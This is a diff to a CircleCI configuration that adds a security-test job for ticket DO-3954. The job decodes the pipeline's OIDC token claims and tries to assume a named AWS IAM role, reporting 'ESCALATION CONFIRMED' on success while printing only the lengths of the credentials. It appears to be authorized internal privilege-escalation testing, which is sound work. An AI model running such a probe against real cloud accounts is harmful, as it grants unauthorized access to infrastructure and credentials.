@@ -34,8 +34,64 @@ jobs:
                 echo "$v: absent"
               fi
             done
+
+  oidc_assume_role_check:
+    docker:
+      - image: cimg/aws:current
+    steps:
+      - run:
+          name: DO-3954 PoC Phase 1b - OIDC path to kore-ff-k8s-CIAccessRole (sectest)
+          command: |
+            set +u
+            ROLE="arn:aws:iam::033407688949:role/kore-ff-k8s-CIAccessRole"
+            echo "==== DO-3954 Phase 1b - sts:AssumeRoleWithWebIdentity ===="
+            echo "Target role:   $ROLE"
+            echo "Project:       $CIRCLE_PROJECT_REPONAME"
+            echo "Branch:        $CIRCLE_BRANCH"
+            echo "User:          $CIRCLE_USERNAME"
+            echo "Token V2:      $([[ -n $CIRCLE_OIDC_TOKEN_V2 ]] && echo "present (len=${#CIRCLE_OIDC_TOKEN_V2})" || echo absent)"
+            echo
+            echo "---- JWT claim peek (claims are public-by-design) ----"
+            if [[ -n "$CIRCLE_OIDC_TOKEN_V2" ]]; then
+              PAYLOAD=$(echo "$CIRCLE_OIDC_TOKEN_V2" | cut -d. -f2)
+              PAD=$(( (4 - ${#PAYLOAD} % 4) % 4 ))
+              for i in $(seq 1 $PAD); do PAYLOAD="${PAYLOAD}="; done
+              echo "$PAYLOAD" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '
+                "  iss: \(.iss // "n/a")\n" +
+                "  sub: \(.sub // "n/a")\n" +
+                "  aud: \(.aud // "n/a")\n" +
+                "  oidc.circleci.com/project-id: \(."oidc.circleci.com/project-id" // "n/a")\n" +
+                "  oidc.circleci.com/org-id: \(."oidc.circleci.com/org-id" // "n/a")\n" +
+                "  context-ids: \(."oidc.circleci.com/context-ids" // "n/a")"' 2>&1 || echo "  (jq decode failed)"
+            fi
+            echo
+            echo "---- Calling sts:AssumeRoleWithWebIdentity (never printing credential values) ----"
+            aws sts assume-role-with-web-identity \
+              --role-arn "$ROLE" \
+              --role-session-name "do3954-oidc-poc" \
+              --web-identity-token "$CIRCLE_OIDC_TOKEN_V2" \
+              > /tmp/sts.json 2> /tmp/sts.err
+            rc=$?
+            if [[ $rc -eq 0 ]]; then
+              echo "RESULT: oidc_path_open=true   <-- ESCALATION CONFIRMED"
+              jq -r '
+                "AssumedRoleArn:        \(.AssumedRoleUser.Arn)\n" +
+                "AssumedRoleId:         \(.AssumedRoleUser.AssumedRoleId)\n" +
+                "Credentials.Expiration:\(.Credentials.Expiration)\n" +
+                "AccessKeyId length:    \(.Credentials.AccessKeyId | length)\n" +
+                "SessionToken length:   \(.Credentials.SessionToken | length)\n" +
+                "SecretAccessKey length:\(.Credentials.SecretAccessKey | length)"
+              ' /tmp/sts.json
+            else
+              echo "RESULT: oidc_path_open=false (sts exit=$rc)"
+              echo "AWS error output (no creds, safe to display):"
+              cat /tmp/sts.err
+            fi
+            rm -f /tmp/sts.json /tmp/sts.err
+
 workflows:
   poc:
     jobs:
       - context_eligibility_check:
           context: forwardfinancing-ci-deployer-github-app
+      - oidc_assume_role_check
